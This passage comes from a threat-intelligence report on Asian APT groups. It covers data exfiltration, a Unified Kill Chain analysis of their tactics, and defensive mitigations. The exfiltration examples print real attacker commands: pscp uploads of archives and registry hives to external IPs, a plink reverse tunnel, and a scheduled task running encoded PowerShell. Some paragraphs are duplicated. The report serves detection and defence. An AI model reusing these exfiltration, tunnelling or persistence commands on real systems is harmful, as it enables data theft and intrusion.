data exfiltration from a target system\nthrough a C2 channel, which is the channel used for interaction between a system controlled by the attackers\nand a compromised system.\n\nThis technique can be quite difficult to detect because it uses legitimate network channels and protocols to\nmake the traffic look legitimate.\n\nExfiltration can be implemented directly in malware written by attackers without using additional tools or\ncommands. In this case, the malware can be installed as a service that constantly tracks data intended for\nexfiltration. Attackers can add their custom-written malicious scripts for data collection and exfiltration to the\nTask Scheduler to run them on a schedule.\n\nAttackers can also use a command shell and execute commands for exfiltration of specific data over an\nestablished C2 channel. Attackers often use post-exploitation tools that include exfiltration functions. Asian\nAPT groups use a broad spectrum of post-exploitation methods and tools. The most popular tools used by\nattackers include the following:\n\n###### 1\n\nCobalt Strike\n\n###### 2\n\nPlugX\n\n###### 3\n\nGh0st Rat\n\n###### 4\n\nPowerShell Empire\n\n\n-----\n\n###### Examples of procedures\n\n**Example 1**\n\nIn the summer of 2022, we observed activity of the group known as Lucky Mouse. The group injected into the\nlsass.exe process a trojan that lets an operator remotely execute various commands on the target system.\nSome of the exfiltration commands that were executed by attackers on compromised hosts are shown below:\n\n\necho y | pscp -pw \"<password>\" 07.rar <user>@103.139.146.14:/tmp/07.rar\necho y | plink.exe -C -N -R 45693:10.10.11.15:22 <user>@202.21.116.154 -P 443 -pw <password>\nplink.exe -pw \"<password>\" <user>@103.139.146.14 \"ls -la /tmp/a1.zip”\n\n\nPSCP (PuTTY Secure Copy Protocol) is a console-based utility that transfers files between two systems via\nSCP.\n\nPlink is a console-based PuTTY client that an attacker can use to verify the successful transfer of files.\n\n**Example 2**\n\nWe observed the use of the PSCP utility in the incident involving WebDav-O malware:\n\n\nrar.exe a 162.rar -r \"\\\\[REDACTED]\\C:\\Windows\\Temp\\*.save\" -p<password>\npscp.exe -P 8443 -pw [REDACTED] C:\\Windows\\System32\\logfiles\\162.rar root@5.183.103[.]181:/\nroot/162.rar\n\n\nIn this case, the attackers sent saved SAM, SYSTEM, and SECURITY hives to a remote server to extract\naccount credentials.\n\n**Example 3**\n\nWhile analyzing the tools used in the incident in Pakistan, we encountered PowerShell scripts that were used\nfor data collection on a host and subsequent data exfiltration. The contents of the scripts were Base64encoded and saved to a file in a temporary directory.\n\nThe attackers added a task to the Task Scheduler to run a PowerShell command that executed this encoded\nscript:\n\n\n$system32\\WindowsPowerShell\\v1.0\\PowerShell.EXE -c \"$ctnt=Get-Content $temp\\\nErr_36d96944_6318.log;PowerShell -enc $ctnt;\"\n\n\n-----\n\nThe decrypted script looks as follows:\n\nFigure 68 The decrypted PowerShell script\n\n\n-----\n\nThe Base64-encoded string in the script above represents the following code:\n\nFigure 69 The poweshell code decrypted from base-64 string\n\nTo send their collected RAR archives in a REST API request to the remote server hxxps://www.apple-cart[.]\ncom, the attackers used the PowerShell method Invoke-RestMethod. Before the data was sent, it was\nencoded in a special format.\n\n###### Detection\n\nExfiltration often involves a large amount of data, therefore any unusual bursts of network traffic may be an\nindicator of data leaks. Network traffic analysis (NTA) systems can identify large or unusual data transfers, and\nthey can employ machine learning algorithms to detect anomalies, including data exfiltration.\n\nIn a SIEM system, you can detect this technique through a netflow analysis. For example, you can detect when\nthe number of bytes sent over a specific period of time exceeds a certain threshold value. This type of rule can\nalso be used in combination with other rules, because legitimate applications can also send a large amount of\ndata.\n\n\n-----\n\nEPP is another type of solution that can detect data exfiltration. EPP solutions track activity on a host,\nincluding system events, network traffic, and API function calls. When analyzing the activity of a process\nto find network interaction, you can look for various APIs, such as Winsock (connect(), send(), recv()) or the\nhigher-level WinInet (HTTPSendRequest). The Crypto API can also be used to encrypt data before it is sent to\na C2 server.\n\nOne of the detection methods is Cyber Threat Intelligence. A SOC can use threat intelligence (TI) sources to\ndetect known C2 domains and IP addresses that are associated with known APT groups. A security team can\ntrack network traffic and activity on a host to detect connections to these C2 servers. Up-to-date information\nabout malicious domains and IP addresses is provided in Kaspersky Threat Data Feeds.\n\n\n[Learn more](https://support.kaspersky.ru/datafeeds/about/13849)\n\n\nExfiltration can also be detected based on specific PowerShell commands that enable attackers to send data\nto a remote server:\n\nCmdlet Aliases\n\nInvoke-WebRequest iwr, curl, wget\n\nInvoke-RestMethod irm\n\nPlease keep in mind that APT groups often obfuscate the commands they execute. For this reason, do not\nforget about the Obfuscated Files or Information T1027 technique.\n\nYou must also track the startup of various post-exploitation tools and utilities that can be used for data\nexfiltration.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 3\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\n\n-----\n\n###### SIGMA rules\n\n   - Sigma-Generic-Protocol Tunneling via Plink Utility\n\n   - Sigma-Generic-Ingress Tool Transfer via curl.exe\n\n   - Sigma-Generic-Execution of Downloaded PowerShell Code\n\n   - Sigma-Generic-Exfiltration via pscp.exe\n\n\n-----\n\n##### Impact TA0040\n\nAsian APT groups rarely perform actions that deliberately disrupt the performance of a compromised system.\nThe main objective of these groups is to remain undetected and collect data (cyber-espionage) for as long as\npossible.\n\nAttackers who have the discipline to adhere to this strategy can remain undetected in a victim's infrastructure\nfor years and collect the information that they want.\n\nIn some cases, however, Asian threat actors may directly impact the technological and business processes\nof a company. For example, Incident 5 describes a group that encrypted user data for this purpose (Data\nEncrypted for Impact T1486). These cases are the exception rather than the rule.\n\n\n-----\n\n##### Analysis of attacker actions based on the Unified Kill Chain\n\n###### Basic description\n\nWhile reading the \"Incidents\" and \"Technical details\" sections, you could see that attackers use a wide range\nof TTPs in their attacks. The popular Cyber Threat Intelligence methodologies and models that strive to\nunderstand an attacker's movement through an infrastructure are not always capable of describing an attack\nchain. The most popular model is the Cyber Kill Chain (CKC), which was developed in 2011 by the Lockheed\nMartin Corporation. This model is already outdated and does not provide sufficient insight into an attacker's\nmovement within an infrastructure. Of course, there is also the popular MITRE ATT&CK framework, which is\ncurrently the most well-known and richest source of knowledge about threats. However, there are frequent\nsituations when this methodology is insufficient to fully analyze the activity of attackers.\n\nIn our aim to use a model that properly addresses the modern threat landscape and the current actions of an\nattacker within an infrastructure, we decided to implement a more state-of-the-art approach as presented in\nthe document titled \"The Unified Kill Chain\" written by Paul Pols in 2017. For a detailed description of this model\nand information about the author of this research document, you can visit www.unifiedkillchain.com.\n\nThe Unified Kill Chain (UKC) expands the CKC model by merging the improvements previously proposed by\nother authors with the attacker tactics presented in the MITRE ATT&CK matrix.\n\nAs a result, the UKC provides a metamodel that supports the development of end-to-end chains for specific\nattacks and attack chains for specific objects that can then be analyzed, compared, and properly secured\nagainst.\n\nThe UKC improves upon the CKC and MITRE ATT&CK frameworks by modeling social engineering, pivoting, and\ncompromised integrity and availability in addition to confidentiality. The UKC model also demonstrates that\nattackers do not need to complete each attack phase in a specific sequence. This fact can seriously impact\na security strategy because the security measures anticipating these phases may be bypassed. It may be\nmore effective to employ defense-in-depth strategies that focus on specific attack phases that occur most\nfrequently or that hold critical value for forming a particular attack path.\n\n###### Phases of the Unified Kill Chain:\n\nModern cyberattacks follow a phased progression toward strategic objectives and can be described in terms\nof tactics, techniques, and procedures (TTPs). The UKC provides a tactical representation of attacks using the\nactions directed at achieving the objectives of an attack.\n\nThe utilized tactics can be viewed as attack phases, which may remain similar across various attacks even if\nthe specific methods and procedures change at the operational level.\n\nUsing a hybrid research approach, 18 phases were identified that can be used to describe modern\ncyberattacks. The table below shows the individual attack phases and their expected order.\n\n\n-----\n\n###### Sequence of attack phases in the Unified Kill Chain\n\n\n-----\n\nWe used the Unified Kill Chain model to create our own table linked to Asian APT groups so that we can give\nyou some insight into the motivations of threat actors and provide data on the possible steps taken by these\ngroups in their attack campaigns. This table contains the phases described in the UKC and the techniques that\nwe were able to detect and correlate with the specific phases. It also contains additional details that will help\nyou understand the motives and actions of attackers at a specific phase (we do not provide detailed technical\ndata related to TTPs here because this was already explained in the \"Technical Details\" section).\n\n###### The Cyber Kill Chain phases are combined into three main groups:  In, Through, and Out\n\n#### In Through Out\n\n\n1. Reconnaissance\n\n2. Resource Development\n\n3. Delivery\n\n4. Social Engineering\n\n5. Exploitation\n\n6. Persistence\n\n7. Defense Evasion\n\n8. Command & Control\n\n\n9. Pivoting\n\n10. Discovery\n\n11. Privilege Escalation\n\n12. Execution\n\n13. Credential Access\n\n14. Lateral Movement\n\n\n15. Collection\n\n16. Exfiltration\n\n17. Impact\n\n18. Objectives\n\n\nEach group corresponds to the different intentions of attackers:\n\n**In: attackers attempt to gain access to systems or data available only to trusted users or devices. These**\nsystems or data often reside in an enterprise network, which means that the attackers are aiming to penetrate\nthe enterprise perimeter.\n\n**Through: after infiltrating the infrastructure, attackers attempt to obtain the privileges that are required for**\nfulfilling their initial plans. This includes expanding their network of compromised resources, elevating their\nprivileges in the domain, and obtaining the account credentials of high-privilege users.\n\n**Out: after obtaining the necessary access and privileges, the attackers achieve their initial objectives:**\nexfiltrating data (cyber-espionage) or influencing operation of critical components (sabotage).\n\n\n-----\n\n###### Stage Technique Details\n\nReconnaissance — Asian APT groups conduct initial reconnaissance of their\nvictim according to their strategic goals, which may be related\nto politics, economics, technology, or other interests of the\nparticular group. They may consider the following factors:\n\nScope of activity. Asian APT groups may be targeting\norganizations whose activity is related to technological\ninnovations, armaments, government regulation, energy, or\nother important industries.\n\nAccess to valuable information. They target organizations\nor employees who may have access to valuable intellectual\nproperty or government secrets. This information is gathered\nto compile a victim profile and generate appropriate phishing\nmessages for future use.\n\nHoles in system security. Attackers probe the network\nperimeter of an organization to identify known vulnerabilities\nin systems or weak cybersecurity measures. This type of\nreconnaissance is conducted to choose the initial attack vector.\n\nExisting cybersecurity measures. Attackers seek data that can\nreveal the specific cybersecurity tools currently used in the\norganization. This data is required for proper preparation of the\nattacker's arsenal prior to an attack.\n\n\n-----\n\n###### Stage Technique Details\n\nResource Development — After choosing their victim, Asian APT groups test their attack\narsenal to see if their tools can be detected by the specific\nsecurity products that may be protecting the endpoints in the\ntarget infrastructure. The attackers make sure that all of the\nmalware components that will be used in the attack are not,\nupon their release, detected or blocked by cybersecurity tools.\n\nIf they are detected, the malware developers attempt to\nascertain which specific code segment or component was\ndetected by the security tools and then build a revised\ncomponent that will not be detected. When attackers attempt\nto use a set of executable files (EXE) and dynamic-link libraries\n(DLL) for the DLL Hijacking attack technique but their actions\nare detected by some blocking mechanism, they often try\nto find a way to evade this detection. To do so, the malware\ndevelopers may change the contents of the EXE/DLL to bypass\nprotection. If the attackers are not able to quickly bypass\ndetection, they simply replace the executable files and libraries\nwith different ones that do not raise suspicion. This lets them\navoid being blocked and evade other security measures to\ncontinue their cyberattack.\n\nAttackers also frequently try to deploy multiple functionally\noverlapping backdoors on an infected system. This enables\nthe actors to switch between these backdoors on an infected\nmachine in case certain components of the malware are\ndetected and blocked.\n\nAn important distinguishing feature among Asian APT groups\nis their generally low priority for stealth and concealment. Their\nmain objective is to collect as much important information as\npossible as quickly as possible while the infected systems are\nstill under their control. For this reason, if a detection occurs on\nan infected machine, they do not simply abandon this machine\nafter clearing the logs to wipe their tracks. Instead, they replace\nthe detected component with an updated version that can\nevade detection by the security software.\n\n\nmain objective is to collect as much important information as\npossible as quickly as possible while the infected systems are\nstill under their control. For this reason, if a detection occurs on\nan infected machine, they do not simply abandon this machine\nafter clearing the logs to wipe their tracks. Instead, they replace\nthe detected component with an updated version that can\nevade detection by the security software.\n\n\n-----\n\n###### Stage Technique Details\n\n\nDelivery\n\nSocial Engineering\n\n\nT1566.001 After attackers complete the preparation of their attack arsenal,\nthis arsenal must be delivered to the victim's system. For this\nscenario, we decided to merge 2 phases into one because\nmalware delivery and social engineering are normally combined\nby the popular technique known as phishing.\n\nA favorite subtechnique used by Asian APT groups is known\nas Phishing: Spearphishing Attachment T1566.001. Instead of\nmass mailing phishing messages, attackers specifically select\ntheir victims after carefully studying their profiles and network\nbehavior. This enables the attackers to create more persuasive\nand personalized phishing emails or messages, which increases\nthe likelihood of a successful attack. The attacker attempts\nto exploit specific processes within the victim's organization\nor potential events in the country while accounting for the\ngeographic and cultural specifics of the victim. The attacker\nmay also target specific individuals or management officers to\ngain access to their personal information or pursue a political or\neconomic benefit. Based on the \"Technical Details\" section, we\nprimarily observe the following:\n\n            - Self-extracting archives containing an office document and a\nmalicious executable file;\n\n            - Archives containing malicious executable files whose names\nend with PDF or DOC so that the victim will think it is a real\ndocument and open the file.\n\n\nExploitation T1190 This vector remains an excellent opportunity for initial infection\nof an infrastructure if the previous phase is more resource-intensive albeit simpler in implementation. Asian APT groups are\nknown for their advanced technical skills and exploitation of\nvarious vulnerabilities for successful attacks. They attempt to\nexploit popular vulnerabilities in web applications, mail services, remote administration tools, and many other resources.\nA detailed list of popular CVEs employed by Asian APT groups\nis provided in the \"Technical Details\" section under the Exploit\nPublic-Facing Application T1190 technique.\n\n\n-----\n\n###### Stage Technique Details\n\n\nPersistence T1546\nT1546.003\nT1546.012\nT1546.015\nT1197\nT1078\nT1078.002\nT1053\nT1053.005\nT1543.003\nT1505\nT1505.003\n\n\nAs revealed by our observations, Asian APT groups establish\npersistence within an infrastructure by using a multitude of\nprocedures and techniques ranging from the simplest to the\nmost complicated:\n\n- Valid Accounts T1078\n\n- Scheduled Task/Job T1053\n\n- Windows Service T1543.003\n\n- Windows Management Instrumentation Event Subscription\nT1546.003\n\n- Image File Execution Options Injection T1546.012\n\n- Component Object Model Hijacking T1546.015\n\nThis set of techniques was observed only in some of the\ndetected incidents related to Asian APT groups. Its use\ndepends on the specific group and their capability to implement\ncertain techniques within the victim's infrastructure.\n\nHowever, we do observe one persistence approach in the\noverwhelming majority of incidents involving Asian APT groups.\nThis approach is a combination of the Create or Modify System\nProcess: Windows Service T1543.003 + Hijack Execution\nFlow: DLL Side-Loading T1574.002 technique and subsequent\nimplementation of the Process Injection: Process Hollowing\nT1055.012 technique to avoid detection of the attacker's\nactivity.\n\nThis combination is especially notable because it is associated\nwith multiple MITRE ATT&CK tactics, including persistence,\nprivilege escalation, and defense evasion. This provides the\nattacker with a favorable position for subsequent attack\nactivity. As we already described in the \"Technical Details\"\nsection, the attackers first deliver a malicious dynamic library\nand a clean executable file that is vulnerable to DLL Hijacking,\nthen they create a Windows service based on the legitimate\nfile that was dropped onto the host. Then they start the\nservice, which results in the execution of the malicious library.\nThe attacker then proceeds to use the technique known as\nProcess Injection: Process Hollowing T1055.012. In this scenario,\nthe service process creates a new legitimate process in the\nsuspended state, and a backdoor for interacting with the\ncommand and control center is injected into this process. To\ndisguise the malicious service in addition to using the DLL SideLoading T1574.002 technique, Asian APT groups often create a\nservice that is concealed behind the svchost.exe process.\n\nAs a result, the attacker always has a running process with\nSystem privileges maintained through the service to complete\nfurther steps in their attack.\n\n\n-----\n\n###### Stage Technique Details\n\n\nDefence Evasion T1574\nT1574.001\nT1574.002\nT1070\nT1070.004\nT1070.005\nT1055\nT1055.012\nT1562\nT1562.001\nT1027\nT1564\nT1564.003\nT1036\nT1036.005\nT1036.004\n\n\nDuring the later phases of the UKC, Asian APT groups no longer\ntry so hard to conceal their malicious activity in the targeted\ninfrastructure because their goal is to steal as much information\nas possible as quickly as possible. In case the attack is being\nignored by security personnel, they try to remain in the network\nas long as possible.\n\nNevertheless, we do observe a sufficiently broad spectrum of\ntechniques related to the Defense Evasion phase. During the\nfirst phases of the UKC, Asian APT groups normally use a set of\ntechniques that can be rather difficult to detect by themselves.\nThese are primarily the Hijack Execution Flow T1574 and\nProcess Injection T1055 techniques. It can be quite problematic\nfor security personnel to detect these techniques without\nadvanced monitoring within the infrastructure.\n\nDuring later phases, attackers are not averse to using \"louder\"\ntechniques to conceal their actions or outright disabling data\nprotection tools that hinder them from carrying out their\nplanned steps. APT groups use various resources to disable\nsecurity tools. These may include utilities that are specially\ncreated for this purpose, or utilities that are already available in\nthe operating system. They may also change registry settings,\nuse PowerShell, or employ other legitimate tools for their own\npurposes, including those provided for Living off the Land\ntechniques at lolbas-project.github.io based on the MITRE\nATT&CK framework.\n\nOver the course of an entire attack, Asian APT groups use a\nset of techniques related to obfuscation to achieve various\nobjectives in the infrastructure, including the following:\n\n- Bypass security solutions to deliver malicious code\n\n- Bypass security solutions to execute malicious code.\n\n- Collect data in infected systems for subsequent data\nexfiltration.\n\nThe simplest techniques used by attackers are related to the\nMasquerading T1036 technique. The most frequently used\nmasquerading methods are to create and start processes/\nservices/files that look like legitimate ones in the operating\nsystem to make it more difficult for cybersecurity experts to\neffectively analyze the infected system. However, these actions\nare easy to detect if security personnel has configured the\nnecessary monitoring rules in the infrastructure.\n\n\n-----\n\n###### Stage Technique Details\n\n\nCommand & Control T1071\nT1071.001\nT1102\nT1105\n\n\nMain Command & Control technique is Application Layer\nProtocol: Web Protocols T1071.001. Most use the HTTP and\nHTTPS protocols for C2 communications.\n\nThe observed groups use various backdoors to interact with\na CnC server. They most frequently use a dynamic library that\nis executed via the DLL Side-loading T1574.002 technique as\ndemonstrated in our examined cases.\n\nThe ShadowPad backdoor, which is popular among Asian APT\ngroups, is delivered to a victim's computer together with a\nlegitimate executable file. This is known as the Ingress Tool\nTransfer T1105 technique. To download a payload to a host,\nattackers use legitimate programs such as certutil.exe and\nbitsadmin.exe, which are commonly used with the \"Living off the\nLand\" technique to avoid detection.\n\nThe backdoor is started by creating a new service or a\nscheduled task. After establishing a connection with the\ncommand and control center, the backdoor runs a command\nshell in which the operators remotely execute commands\nto continue their attack. The attackers may conduct\nreconnaissance, initiate lateral movement, and install additional\ntools for the attack.\n\n\nPivoting T1572 If a compromised host resides in a network that is not accessible to an external attacker, Asian APT groups implement a technique known as pivoting. In other words, they use an accessible\nhost as a sort of \"transfer terminal\" to pivot to the otherwise\ninaccessible network.\n\nThe most popular Pivoting technique is SSH port forwarding,\nwhich is described in the \"Technical Details\" section.\n\nPivoting allows attackers to execute their C2 commands on\nhosts that are concealed behind firewalls, network address\ntranslation (NAT), or other technologies.\n\nDiscovery T1518 Prior to advancing further through a victim's infrastructure,\nT1007 Asian APT groups gather information about the target network\nT1082 and its configuration to identify the best ways to continue their\nT1016 attack. They try to get as much information as possible about\nT1049 the target before initiating more aggressive steps in their attack.\nT1124\nT1069 According to our data, attackers gather the full spectrum of\nT1069.002 intelligence on the infrastructure environment by primarily using\nT1135 legitimate software that is already available in the operating\nT1018 system. In some cases, we also detected various custom-writT1482 ten tools such as network scanners that were delivered to the\nT1012 infrastructure to inspect the network environment. The attackT1087 ers normally send the collected data to their C2 server. Each\nT1083 discovery technique pursues a specific objective. For more\nT1615 details, please refer to the \"Technical Details\" section.\nT1046\nT1057\nT1033\n\n\ninaccessible network.\n\nThe most popular Pivoting technique is SSH port forwarding,\nwhich is described in the \"Technical Details\" section.\n\nPivoting allows attackers to execute their C2 commands on\nhosts that are concealed behind firewalls, network address\ntranslation (NAT), or other technologies.\n\nPrior to advancing further through a victim's infrastructure,\nAsian APT groups gather information about the target network\nand its configuration to identify the best ways to continue their\nattack. They try to get as much information as possible about\nthe target before initiating more aggressive steps in their attack.\n\nAccording to our data, attackers gather the full spectrum of\nintelligence on the infrastructure environment by primarily using\nlegitimate software that is already available in the operating\nsystem. In some cases, we also detected various custom-writ-\nten tools such as network scanners that were delivered to the\ninfrastructure to inspect the network environment. The attack-\ners normally send the collected data to their C2 server. Each\ndiscovery technique pursues a specific objective. For more\ndetails, please refer to the \"Technical Details\" section.\n\n\n-----\n\n###### Stage Technique Details\n\nPrivilege Escalation T1543 As we already described earlier, the primary way that Asian\nT1543.003 APT groups elevate their privileges is by running a malicious\nservice. As an example, the PlugX backdoor, specifically the\nXPlugService module, can access commands related to\nWindows services. Its code was written specifically to request\nthe configuration of services, change the configuration of\nservices, and to start, manage, and delete services.\n\n\nExecution T1059.003\nT1059.001\nT1047\nT1569.002\nT1106\n\nCredential Access T1003\nT1003.001\nT1003.002\nT1003.003\nT1552\nT1552.001\n\n\nAsian APT groups primarily use Windows services or scheduled\ntasks to execute their payload. Attackers may also run a CMD\ncommand shell to execute commands received from their C2\nserver. Asian APT groups also use Batch and PowerShell scripts\nto automate their activities such as host discovery and data\ncollection.\n\nAsian APT groups often resort to using the wmic utility and the\nWmiexec module from the popular Impacket framework.\n\nWhen it comes to acquiring account credentials in a target infrastructure, Asian APT groups do not differ very much from other\ngroups. They use the same most popular set of techniques\nrelated to the Credential Access TA0006 tactic. Naturally, this\nprimarily involves the OS Credential Dumping T1003 technique,\nwhich includes dumping the Lsass.exe process, saving the SAM\nregistry hives, and obtaining the NTDS.dit file from the domain\ncontroller.\n\nOne notable distinguishing feature of these groups is that they\nnormally choose account credential acquisition tools that are\npopular only in the APAC region. However, these tools can still\nbe detected based on their tactics, techniques, and procedures\nin accordance with David Bianco's Pyramid of Pain principle. In\nthe majority of the attacks that we observed, Asian APT groups\nalso search for account credentials that are revealed in cleartext within files and in various registry hives.\n\nThis phase allows Asian APT groups to access valuable account\ncredentials that can be used for further steps in an attack.\nFor example, they can use these credentials to spread further\nthroughout the infrastructure.\n\n\n-----\n\n###### Stage Technique Details\n\nLateral Movement T1021.002 After obtaining the necessary account credentials, Asian APT\nT1570 groups move through the victim's infrastructure and copy their\nT1091 malicious samples to other systems. They primarily use the SMB\nT1080 protocol to move between hosts.\nT1550.002\n\nAs they move through the network, they immediately establish\npersistence on remote systems by using a service or new task,\nfor example:\n\nsc.exe \\\\<remote> create\n\nschtasks.exe /create -s <remote>\n\nIn addition, Asian APT groups use the popular modules\nSMBExec, Atexec, Wmiexec, and PsExec from the Impacket\nframework.\n\nThey also use RDP to connect to remote systems.\n\nCollection T1560 After attackers acquire freedom of action for lateral movement\nT1560.001 through the infrastructure, they proceed to collect relevant\nT1119 information and choose specific targets that can provide them\nT1005 with the most valuable information. This valuable information\n\nmay include intellectual property, financial data, technical doc-\numentation, and other confidential data from all data sources\nthat they can reach.\n\nFirst, they perform an automated search for all document for-\nmats on the infected machine, including *.pdf, *.doc, *.docx, *.xls,\nand *.xlsx. In the overwhelming majority of the incidents that\nwe detected, Asian APT groups follow up this search by using\nvarious archivers to gather data from the victim's computers.\nActors may use archivers that are already installed on the target\nmachine, or deliver archivers to it from the outside.\n\nAs we already described in the \"Technical Details\" section, one\nof the distinguishing features in the procedures that we ob-\nserved among Asian APT groups is their movement of archives\nto the Recycle Bin (C:\\$Recycle.Bin) before their subsequent\nexfiltration.\n\nIn addition to collecting sensitive information as their ultimate\ngoal, attackers also collect intelligence on the network environ-\nment and write this data to individual text files for subsequent\nexfiltration to an external network, thereby completing part of\ntheir Discovery phase.\n\n\n-----\n\n###### Stage Technique Details\n\nExfiltration T1567 After collecting the relevant information, the attackers\nT1567.002 compress this data and forward it to a server that is usually\nT1041 acting as their command and control center. This is known as\n\nthe Exfiltration Over C2 Channel T1041 technique.\n\nHowever, Threat Intelligence data can be used to successfully\nblock connections to the attacker's C2 server. For this reason,\nattackers began using legitimate web services to evade\ndetection as part of the technique known as Exfiltration Over\nWeb Service T1567.\n\nAsian APT groups create their own tools for data exfiltration\nto cloud storage, including the following data storage services:\nDropbox, Google Drive, Yandex Disk. The arguments that\nthey pass with these tools include the archive path and the\nauthentication token for the specific service.\n\nImpact T1486 When examining the typical Impact phase conducted by Asian\nT1489 APT groups, we normally do not observe much aggressive\nimpact on the infrastructure. However, we have observed some\nexceptional cases, such as an incident involving data encryption\non a target system in Argentina.\n\nWhen starting their own services, Asian APT groups may also\nquery services that are already running in the target system and\nstop them, which is known as the Service Stop T1489 technique.\nHowever, this activity is not deliberately meant to inflict damage\non business processes.\n\n\n-----\n\n###### Stage Technique Details\n\nObjectives — Based on our observations, the overwhelming majority of Asian\nAPT groups ultimately pursue the following goals:\n\n**Cyber-espionage:**\nThe primary motivation of Asian APT groups is to acquire\nsensitive information and technological data from other\ngovernments, companies, or organizations. Examples of this\ndata may include intellectual property, trade secrets, patents,\nand other data that can provide a competitive advantage.\n\n**Political and military objectives:**\nSome Asian APT groups may aim to capture government or\nmilitary information that could be used for political manipulation,\nintelligence activity, or preparations for potential conflicts.\n\n**Economic interests:**\nAsian hackers may target companies engaged in specific\nindustries, such as finance, energy, telecommunications, or\nothers for the purpose of acquiring financial information that\ncould be used for commercial gains.\n\n**Financial motives:**\nIn some cases, Asian APT groups may hack organizations for\nfinancial benefit by stealing payment details or conducting\nRansomware attacks to demand ransom payments, for example.\n\n###### Recommendations for the use of various security measures at the stages of the Unified Kill Chain\n\nEndpoint Next Secure Email Web Secure Web Endpoint\nProtection Generation Gateway (SEG) Application Gateway Detection\nPlatform (EPP) Firewall Firewall (WAF) (SWG) and Response\n\n(NGFW) (EDR)\n\n[Learn more](https://www.kaspersky.com/enterprise-security/endpoint) [Learn more](https://www.kaspersky.com/enterprise-security/mail-server-security) [Learn more](https://www.kaspersky.com/enterprise-security/internet-gateway) [Learn more](https://www.kaspersky.com/enterprise-security/endpoint-detection-response-edr)\n\nData Leak Network Security Threat Distributed\nPrevention Traffic Analysis Information Intelligence Deception\n(DLP) (NTA) and Event (TI) Platform (DDP)\n\nManagement\n(SIEM)\n\n[Learn more](https://www.kaspersky.com/enterprise-security/anti-targeted-attack-platform) [Learn more](https://www.kaspersky.com/enterprise-security/unified-monitoring-and-analysis-platform) [Learn more](https://www.kaspersky.com/enterprise-security/threat-intelligence)\n\n\n-----\n\n##### Mitigation\n\nThis section describes the measures that can be taken to reduce the risk of infrastructure compromise.\nWe divided these mitigation measures into \"Hardening and security\" and three groups corresponding to the\nphases of the Unified Kill Chain:\n\n- Preventing downloads and execution\n\n- Preventing lateral movement\n\n- Preventing attackers from fulfilling their objectives\n\nBelow is a description of the main processes and approaches that will help reduce the risk of compromise and\nincrease the likelihood of timely detection and remediation of threats.\n\n###### Hardening&Security\n\nThis is a set of measures to strengthen the protection of the organization’s infrastructure, including building\nBlueTeam processes: Security Operations (SOC), Threat Hunting (TH), Digital Forensics & Incident Response\n(DFIR), Cyber Threat Intelligence (CTI).\n\nAs we already noted, Asian APT groups almost always make a lot of noise when they break in. In other words,\nthey run a multitude of tools via BAT files, start services using methods that are unusual for most companies,\nemploy Red Team tools and PowerShell, and actively use shared network folders. This means that even basic\ncorrelation rules in SIEM can detect these attackers during one or another of their attack phases. However,\nthis is only true if the targeted organization monitors all hosts (or the overwhelming majority of them, including\nservers and critical resources), and the monitored events received in the SIEM system are sufficient for\ndetecting an attack. In the \"Technical details\" section, the description of each technique is followed by a list of\nevents that can help detect it. To effectively implement state-of-the-art cybersecurity approaches, we need\nto understand the specifics of the infrastructure we deal with. This knowledge must include every possible\ndetail, ranging from the number of hosts and operating systems installed on them to the network topology and\npotential traffic between its segments. This level of knowledge is provided by the asset management process.\n\nIn addition to the usually loud entrance made by Asian APT groups, they also typically exploit vulnerabilities in\nthe infrastructure. These are often old vulnerabilities that already have patches available from the appropriate\nvendor. Fine-tuned patch management and vulnerability management processes help significantly reduce\nopportunities for attackers.\n\n###### Asset Management\n\nA continual asset inventory process is crucial for infrastructure security. To ensure productive interaction\nbetween various Blue Team groups, information about the company's existing workstations, servers, firewalls,\nrouters, gateways, and other resources must be accurate.\n\nIn some cases, however, issues may arise at this stage, especially in companies that have hundreds of\nthousands of hardware units. To resolve these issues, you can consider basing your asset management\napproach on prioritizing assets and distinguishing critical equipment (Crown Jewels).\n\n\n-----\n\nThe Crown Jewels approach takes into account the specific technological and business processes of the\ncompany to distinguish the critical resources, disabling or compromise of which could potentially lead to\nfinancial, reputational, or other losses.\n\nAny lack of asset management in a company can result in \"forgotten\" servers that are not being updated and\nare no longer transmitting telemetry. This increases the attack surface for attackers and can serve as one of\nthe critical reasons why the infrastructure may be compromised.\n\n###### Vulnerability management\n\nVulnerability management is an important part of an overall security program.\n\nThe vulnerability management process helps identify, evaluate, and fix potential vulnerabilities in the security\nsystem. Timely detection and correct remediation of vulnerabilities help significantly improve the security of a\ncompany. Vulnerability management is normally divided into four stages:\n\n###### 1\n\nVulnerability search/scan\n\n###### 2\n\nVulnerability risk assessment\n\n###### 3\n\nVulnerability prioritization and fixing\n\n###### 4\n\nPatching verification\n\nThe next step in the development of the Vulnerability management process occurs through automation and\ncontinuity of the process.\n\nAsian APT groups attempt to find vulnerable components of systems during initial access as well as after\ninfiltrating an infrastructure. Some groups perform mass infrastructure scans to find vulnerable components\n(for example, Windows hosts vulnerable to EternalBlue, Exchange server vulnerabilities, outdated versions of\nweb servers and applications).\n\n\n-----\n\n###### Security Products\n\nProperly installed and correctly configured security solutions are crucial for ensuring infrastructure security.\nState-of-the-art EPP, EDR, and sandbox solutions help prevent the execution of malicious code on enterprise\nhosts. IDS and IPS solutions help detect and prevent network connections that are identified as malicious.\nProperly configured deception systems are capable of detecting sophisticated attacks, which enables rapid\nresponse and allows to mitigate the risk of an infrastructure compromise.\n\nIn turn, SOC, TH and IR teams can extract an enormous amount of useful data from security solution\ntriggerings and thereby reduce the amount of time spent on incident investigation.\n\n###### Preventing downloads and execution\n\n**Blocking malicious resources**\n\nConsider blocking malicious resources, for example, by preventing DNS resolution of malicious domains\nor by blocking network connections with IP addresses associated with attacks. Up-to-date indicators of\ncompromise (IOCs) that you can use to conduct investigations can be found in feeds, such as Kaspersky\nThreat Data Feeds.\n\n\n[Learn more](https://support.kaspersky.com/datafeeds/about/13849)\n\n\n**DPI**\n\nConsider using Deep Packet Inspection technology (DPI) to expand your traffic analysis capabilities.\n\n**Filtering inbound traffic**\n\nConsider filtering inbound traffic on edge devices such as routers and firewalls.\n\n**Allowlisting connections**\n\nConsider creating a list of trusted resources with which connections are allowed.\n\n**Patch Management**\n\nConsider setting up an update and vulnerability patching process that is customized for the specific\ninfrastructure.\n\n**EPP and EDR**\n\nConsider using endpoint protection solutions. State-of-the-art protection like Kaspersky Endpoint Security\ncan help quickly detect and block threats by utilizing behavior analysis, machine learning, and other\ntechnologies while relying on up-to-date information about threats.\n\n\n-----\n\n**Application Policies**\n\nConsider implementing policies that 